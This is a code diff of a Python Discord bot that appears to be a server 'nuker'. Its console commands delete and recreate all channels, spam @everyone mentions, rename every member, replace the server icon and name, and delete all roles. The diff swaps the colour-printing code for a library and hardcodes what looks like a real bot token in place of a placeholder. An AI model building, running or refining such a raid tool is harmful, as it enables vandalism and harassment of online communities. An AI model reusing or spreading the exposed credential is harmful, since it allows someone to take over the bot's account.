@@ -1,16 +1,13 @@
 import discord
 from discord.ext import commands
 import requests
+from colorist import Color
+from colorist import Effect
 
-TOKEN = 'YOUR_TOKEN_HERE'
+TOKEN = 'MTA5NTUxNTI4NDYzNjQ1MDg5Nw.GcKfi4.ALZkieP2FevkJZtsT1NH3okyOWiNFK25NR8hsw'
 
 intents = discord.Intents.all()
 bot = commands.Bot(intents=intents)
-
-class colors:
-  GREEN = '\x1b[32m'
-  ENDC = '\033[0m'
-  BOLD = '\033[1m'
 
 @bot.event
 async def on_ready():
@@ -21,7 +18,7 @@ async def on_ready():
 async def setup(ctx):
   print("Commands: \nremoveall - removes all channels and replaces them\nspam - sends a message with @everyone appended \nnick - nicks all users with an input \nicon - replaces the icon and name of the server \nrole - removes all available roles")
   while True:
-    command = input(f"{colors.BOLD}{colors.GREEN}{ctx.guild.id}{colors.ENDC} > ")
+    command = input(f"{Effect.BOLD}{Color.GREEN}{ctx.guild.id}{Color.OFF} > ")
     
     
     if (command == "removeall"):
@@ -34,7 +31,7 @@ async def setup(ctx):
           await ctx.guild.create_text_channel(channelName)
         except:
           if not (channelName == " "):
-            print(f"{colors.BOLD}{colors.GREEN}{ctx.guild.id}{colors.ENDC} > Failed Create")
+            print(f"{Effect.BOLD}{Color.GREEN}{ctx.guild.id}{Color.OFF} > Failed Create")
 
     
     if (command == "spam"):
@@ -46,7 +43,7 @@ async def setup(ctx):
           try:
             await channel.send(message + "@everyone")
           except:
-            print(f"{colors.BOLD}{colors.GREEN}{ctx.guild.id}{colors.ENDC} > Failed Send")
+            print(f"{Effect.BOLD}{Color.GREEN}{ctx.guild.id}{Color.OFF} > Failed Send")
 
     if (command == "icon"):
       icon = input("  Icon Link: ") # https://townsquare.media/site/40/files/2017/03/Dog-.jpg?w=1200&h=0&zc=1&s=0&a=t&q=89
@@ -57,7 +54,7 @@ async def setup(ctx):
         await ctx.guild.edit(icon=image_data)
         await ctx.guild.edit(name=name)
       except:
-        print(f"{colors.BOLD}{colors.GREEN}{ctx.guild.id}{colors.ENDC} > Failed Edit")
+        print(f"{Effect.BOLD}{Color.GREEN}{ctx.guild.id}{Color.OFF} > Failed Edit")
 
     if (command == "nick"):
       nickName = input(" New Nickname: ")
@@ -65,15 +62,15 @@ async def setup(ctx):
         try:
           await member.edit(nick=nickName)
         except:
-          print(f"{colors.BOLD}{colors.GREEN}{ctx.guild.id}{colors.ENDC} > Failed nickname")
+          print(f"{Effect.BOLD}{Color.GREEN}{ctx.guild.id}{Color.OFF} > Failed nickname")
 
     if (command == "role"):
       for role in ctx.guild.roles:  
         try:  
           await role.delete()
-          print(f"{colors.BOLD}{colors.GREEN}{ctx.guild.id}{colors.ENDC} > Deleted {role.name}")
+          print(f"{Effect.BOLD}{Color.GREEN}{ctx.guild.id}{Color.OFF} > Deleted {role.name}")
         except:
-          print(f"{colors.BOLD}{colors.GREEN}{ctx.guild.id}{colors.ENDC} > Cannot Delete {role.name}")
+          print(f"{Effect.BOLD}{Color.GREEN}{ctx.guild.id}{Color.OFF} > Cannot Delete {role.name}")
 
 try:
   bot.run(TOKEN)
